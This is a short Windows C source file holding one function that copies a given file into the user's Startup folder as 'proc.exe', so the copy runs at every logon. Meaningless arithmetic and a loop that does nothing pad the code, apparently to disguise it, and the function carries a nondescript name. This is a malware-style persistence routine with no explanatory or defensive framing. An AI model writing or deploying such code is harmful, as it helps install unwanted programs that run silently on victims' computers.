#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v4(const char* source){
    char path[MAX_PATH];
    int m = 42;
    if ((m * 2) == 84) {
        GetEnvironmentVariableA("APPDATA", path, MAX_PATH);
        for(int k=0; k<10; k++) m++;
        lstrcatA(path, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\proc.exe");
        if (m > 0) CopyFileA(source, path, FALSE);
    }
}